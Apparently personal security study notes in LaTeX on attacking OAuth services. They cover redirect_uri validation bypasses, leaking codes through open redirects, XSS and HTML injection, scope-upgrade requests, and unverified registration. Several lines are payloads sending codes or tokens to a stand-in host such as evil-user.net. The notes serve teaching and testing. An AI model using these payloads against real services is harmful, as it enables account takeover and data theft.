\section{Vulnerabilities in the OAuth service}

\subsection{Leaking authorization codes and access tokens}

By stealing a valid code or token, the attacker may be able to access the
victim's data. Ultimately, this can completely compromise their account
allowing  to potentially log in as the victim user on any client application
that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's
browser to the callback endpoint specified in the \verb+redirect_uri+ parameter
of the authorization request. If the OAuth service fails to validate this URI
properly, an attacker may be able to construct a CSRF-like attack, tricking the
victim's browser into initiating an OAuth flow that will send the code or token
to an attacker-controlled \verb+redirect_uri+.

In the case of the authorization code flow, an attacker can potentially steal
the victim's code before it is used. They can then send this code to the client
application's legitimate callback endpoint (the original \verb+redirect_uri+)
to get access to the user's account. In this scenario, an attacker does not
even need to know the client secret or the resulting access token. As long as
the victim has a valid session with the OAuth service, the client application
will simply complete the code/token exchange on the attacker's behalf before
logging them in to the victim's account.

Note that using state or nonce protection does not necessarily prevent these
attacks because an attacker can generate new values from their own browser.

More secure authorization servers will require a \verb+redirect_uri+ parameter
to be sent when exchanging the code as well. The server can then check whether
this matches the one it received in the initial authorization request and
reject the exchange if not. As this happens in server-to-server requests via a
secure back-channel, the attacker is not able to control this second
\verb+redirect_uri+ parameter. 
\subsubsection{Flawed redirect uri validation}

Usually, it is best practice for client applications to provide a whitelist of
their genuine callback URIs when registering with the OAuth service. This way,
when the OAuth service receives a new request, it can validate the
\verb+redirect_uri+ parameter against this whitelist. In this case, supplying
an external URI will likely result in an error. However, there may still be
ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the
\verb+redirect_uri+ parameter to understand how it is being validated. For
example:
\begin{itemize}
        \item Some implementations allow for a range of subdirectories by
            checking only that the string starts with the correct sequence of
            characters i.e. an approved domain. You should try removing or
            adding arbitrary paths, query parameters, and fragments to see what
            you can change without triggering an error.

        \item If you can append extra values to the default \verb+redirect_uri+
            parameter, you might be able to exploit discrepancies between the
            parsing of the URI by the different components of the OAuth
            service. For example, you can try techniques such as:
            \begin{itemize}
                \item \verb+https://<expected-host>@<evil-host>+
                \item \verb+https://<evil-host>#<expected-host>+
                \item \verb+https://<expected-host>.<evil-host>+
            \end{itemize}

        \item You may occasionally come across server-side parameter pollution
            vulnerabilities. Just in case, you should try submitting duplicate
            \verb+redirect_uri+ parameters as follows:
            \verb+https://...&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net+
        \item Some servers also give special treatment to localhost URIs as
            they're often used during development. In some cases, any redirect
            URI beginning with localhost may be accidentally permitted in the
            production environment. This could allow you to bypass the
            validation by registering a domain name such as
            \verb+localhost.evil-user.net+.
\end{itemize}

It is important to note that you shouldn't limit your testing to just probing
the \verb+redirect_uri+ parameter in isolation. In the wild, you will often
need to experiment with different combinations of changes to several
parameters. Sometimes changing one parameter can affect the validation of
others. For example, changing the \verb+response_mode+ from query to fragment
can sometimes completely alter the parsing of the \verb+redirect_uri+, allowing
you to submit URIs that would otherwise be blocked. Likewise, if you notice
that the \verb+web_message+ response mode is supported, this often allows a
wider range of subdomains in the \verb+redirect_uri+. 

\subsubsection{Stealing codes and access tokens via a proxy page}
 Against more robust targets, you might find that no matter what you try, you
 are unable to successfully submit an external domain as the
 \verb+redirect_uri+.

By this stage, you should have a relatively good understanding of which parts
of the URI you can tamper with. The key now is to use this knowledge to try and
access a wider attack surface within the client application itself. 

In such a case it might be possible to try to change the \verb+redirect_uri+
parameter to point to any other pages (maybe with a directory traversal trick)
on a whitelisted domain which might be subject to another vunerability alowwing
to leakthe code or token.

For the authorization code flow, you need to find a vulnerability that gives
you access to the query parameters, whereas for the implicit grant type, you
need to extract the URL fragment.

Usefull vulnerabilities:
\begin{itemize}
    \item {\bf Open redirect}:  use this as a proxy to forward victims, along
        with their code or token, to an attacker-controlled domain where you
        can host any malicious script. Note that for the implicit grant type,
        stealing an access token doesn't just enable you to log in to the
        victim's account on the client application. As the entire implicit flow
        takes place via the browser, you can also use the token to make your
        own API calls to the OAuth service's resource server. This may enable
        you to fetch sensitive user data that you cannot normally access from
        the client application's web UI. 
    \item {\bf Dangerous JavaScript that handles query parameters and URL
        fragments}: for example, insecure web messaging scripts can be great
        for this. In some scenarios, you may have to identify a longer gadget
        chain that allows you to pass the token through a series of scripts
        before eventually leaking it to your external domain.
    \item {\bf XSS vulnerabilities}: Although XSS attacks can have a huge
        impact on their own, there is typically a small time frame in which the
        attacker has access to the user's session before they close the tab or
        navigate away. As the \verb+HTTPOnly+ attribute is commonly used for session
        cookies, an attacker will often also be unable to access them directly
        using XSS. However, by stealing an OAuth code or token, the attacker
        can gain access to the user's account in their own browser. This gives
        them much more time to explore the user's data and perform harmful
        actions, significantly increasing the severity of the XSS
        vulnerability. 
    \item {\bf HTML injection vulnerabilities}: In cases where you cannot
        inject JavaScript (for example, due to CSP constraints or strict
        filtering), you may still be able to use a simple HTML injection to
        steal authorization codes. If you can point the \verb+redirect_uri+
        parameter to a page on which you can inject your own HTML content, you
        might be able to leak the code via the \verb+Referer+ header. For
        example, consider the following img element: 
        \verb+<img src="evil-user.net">+. When attempting to fetch this image,
        some browsers (such as Firefox) will send the full URL in the Referer
        header of the request, including the query string. 
\end{itemize}

\subsection{Flawed scope validation}
In any OAuth flow, the user must approve the requested access based on the
scope defined in the authorization request. The resulting token allows the
client application to access only the scope that was approved by the user. But
in some cases, it may be possible for an attacker to "upgrade" an access token
(either stolen or obtained using a malicious client application) with extra
permissions due to flawed validation by the OAuth service. The process for
doing this depends on the grant type. 

\subsubsection{Scope upgrade: authorization code flow}
 With the authorization code grant type, the user's data is requested and sent
 via secure server-to-server communication, which a third-party attacker is
 typically not able to manipulate directly. However, it may still be possible
 to achieve the same result by registering their own client application with
 the OAuth service.

For example, let's say the attacker's malicious client application initially
requested access to the user's email address using the openid email scope.
After the user approves this request, the malicious client application receives
an authorization code. As the attacker controls their client application, they
can add another scope parameter to the code/token exchange request containing
the additional profile scope:
\begin{verbatim}
POST /token
Host: oauth-authorization-server.com
â€¦
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
\end{verbatim}

If the server does not validate this against the scope from the initial
authorization request, it will sometimes generate an access token using the new
scope and send this to the attacker's client application:
\begin{verbatim}
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    â€¦
}
\end{verbatim}

The attacker can then use their application to make the necessary API calls to
access the user's profile data.

\subsubsection{Scope upgrade: implicit flow}
 For the implicit grant type, the access token is sent via the browser, which
 means an attacker can steal tokens associated with innocent client
 applications and use them directly. Once they have stolen an access token,
 they can send a normal browser-based request to the OAuth service's userinfo
 endpoint, manually adding a new scope parameter in the process.

Ideally, the OAuth service should validate this scope value against the one
that was used when generating the token, but this isn't always the case. As
long as the adjusted permissions don't exceed the level of access previously
granted to this client application, the attacker can potentially access
additional data without requiring further approval from the user.

\subsection{Unverified user registration}
 When authenticating users via OAuth, the client application makes the implicit
 assumption that the information stored by the OAuth provider is correct. This
 can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account
without verifying all of their details, including their email address in some
cases. An attacker can exploit this by registering an account with the OAuth
provider using the same details as a target user, such as a known email
address. Client applications may then allow the attacker to sign in as the
victim via this fraudulent account with the OAuth provider.
